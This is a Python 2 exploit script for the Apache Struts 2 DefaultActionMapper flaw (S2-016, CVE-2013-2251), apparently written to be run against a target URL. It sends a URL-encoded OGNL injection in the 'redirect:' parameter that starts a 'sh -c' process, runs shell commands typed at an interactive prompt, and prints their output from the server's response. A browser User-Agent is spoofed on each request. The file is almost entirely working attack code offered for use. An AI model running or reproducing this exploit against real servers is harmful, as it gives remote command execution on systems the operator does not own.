#!/usr/bin/python
#
# coding=utf-8
#
# Struts 2 DefaultActionMapper Exploit [S2-016]
# Interactive Shell for CVE-2013-2251
#
# The Struts 2 DefaultActionMapper supports a method for short-circuit navigation state changes by prefixing parameters with
# "action:" or "redirect:", followed by a desired navigational target expression. This mechanism was intended to help with
# attaching navigational information to buttons within forms.
#
# https://struts.apache.org/docs/s2-016.html
#
# Greats: Julio Della Flora & Thiago Sena (THX)
# Jonatas Fil (Dkr)

import requests
import sys
import readline

'''
author:jonatas fil a.k.a dkr
'''

# ShellEvil 
if len(sys.argv) == 2:
    target = sys.argv[1] # Payload
    first = target + "?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','"
    second = "'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"
    loop = 1
    while loop == 1:
        cmd = raw_input("$ ")
        while cmd.strip() == '':
            cmd = raw_input("$ ")
        if cmd.strip() == '\q':
            print("Exiting...")
            sys.exit()
        try:
            headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"}
            pwn=requests.get(first+cmd+second,headers = headers)
            if pwn.status_code == 200:
                print pwn.content # 1337
            else:
                print("Not Vuln !")
                sys.exit()
        except Exception,e:
            print e
            print("Exiting...")
            sys.exit()

else: # BANNER
    print('''
 __ _          _ _   __       _ _ 
/ _\ |__   ___| | | /__\_   _(_) |
\ \| '_ \ / _ \ | |/_\ \ \ / / | |
_\ \ | | |  __/ | //__  \ V /| | |
\__/_| |_|\___|_|_\__/   \_/ |_|_|
                                  
          by Jonatas Fil [Dkr]
''')
    print("======================================================")
    print("#    Struts 2 DefaultActionMapper Exploit [S2-016]   #")
    print("# USO: python pwn.py http://site.com:8080/xxx.action #")
    print("======================================================")
    print("bye 1337")
    sys.exit()
    
